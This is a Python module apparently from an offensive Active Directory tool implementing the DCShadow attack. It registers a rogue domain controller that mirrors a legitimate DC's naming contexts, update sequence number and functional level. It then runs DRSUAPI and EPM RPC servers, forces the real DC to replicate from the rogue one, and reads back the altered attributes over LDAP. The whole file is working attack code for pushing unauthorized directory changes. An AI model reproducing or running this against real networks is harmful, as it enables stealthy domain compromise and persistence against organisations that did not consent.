import threading
import time

from R2Log import logger
from dcshadow.model.DomainController import RogueDomainController, LegitDomainController

from dcshadow.manager.SessionsManager import SessionsManager
from dcshadow.utils.server.RpcServer import RPCServer
from dcshadow.utils.server.DrsEndpointHandler import DRSUAPIEndpointHandler
from dcshadow.utils.server.EpmEndpointHandler import EPMEndpointHandler


class ReplicationManager:
    def __init__(self, legit_dc_fqdn, rogue_dc_name, rogue_dc_domain):
        self.legit_dc = LegitDomainController(fqdn=legit_dc_fqdn)
        self.rogue_dc = RogueDomainController(
            domain=rogue_dc_domain,
            netbios_name=rogue_dc_name,
            ds_service_name=self.legit_dc.ds_service_name,
            domain_nc=self.legit_dc.domain_nc,  # TODO handle if we need to set a specific domain_nc if we target a child domain?
            schema_nc=self.legit_dc.schema_nc,
            configuration_nc=self.legit_dc.configuration_nc,
            func_level=self.legit_dc.func_level,
            max_update_seq_num=self.legit_dc.max_update_seq_num
        )
        self.drs_server = None
        self.drs_thread = None
        self.epm_server = None
        self.epm_thread = None

    def startServers(self):
        logger.debug("Starting DRSUAPI Endpoint server")
        self.drs_server = RPCServer(server_address=("0.0.0.0", 1337), handler_class=DRSUAPIEndpointHandler)  # FIXME Make this dynamic
        drs_port = self.drs_server.getListenPort()
        # FIXME fix race condition that make the port to None sometimes
        self.drs_thread = threading.Thread(target=self.drs_server.serve_forever)
        self.drs_thread.start()
        logger.debug(f"DRSUAPI Endpoint port: {drs_port}")
        logger.debug("Starting RPC server with EPM Endpoint")
        self.epm_server = RPCServer(server_address=("0.0.0.0", 135), handler_class=EPMEndpointHandler, drs_port=drs_port)
        self.epm_thread = threading.Thread(target=self.epm_server.serve_forever)
        self.epm_thread.start()
        # drs_thread.join()
        # epm_thread.join()

    def stopServers(self):
        logger.debug("Stopping DRSUAPI Endpoint server")
        self.drs_server.shutdown()
        self.drs_thread.join()
        logger.debug("Stopping RPC server with EPM Endpoint")
        self.epm_server.shutdown()
        self.epm_thread.join()

    def replicate(self):
        logger.verbose("Starting RPC servers")
        self.startServers()
        time.sleep(1)
        logger.verbose("Forcing legitimate DC to ask for a replication")
        self.legit_dc.initReplication(rogue_dc_dns_hostname=self.rogue_dc.dns_hostname)
        time.sleep(1)
        logger.verbose("Stopping RPC servers")
        self.stopServers()
        self.rogue_dc.unregister()

    @staticmethod
    def checkChanges(objects):
        logger.info("Retrieving the value of all target attributes")
        ldap_client = SessionsManager().get_ldap()
        for obj in objects:
            logger.info(f"└── Object: {obj.name} ({obj.distinguished_name})")
            attributes = [attribute.name for attribute in obj.attributes]
            ldap_client.session.search(
                search_base=obj.distinguished_name,
                search_filter="(objectClass=*)",
                attributes=attributes
            )
            if len(ldap_client.session.entries) == 1:
                for attribute in attributes:
                    logger.info(f"└─── {attribute}: {ldap_client.session.entries[0][attribute][0]}")
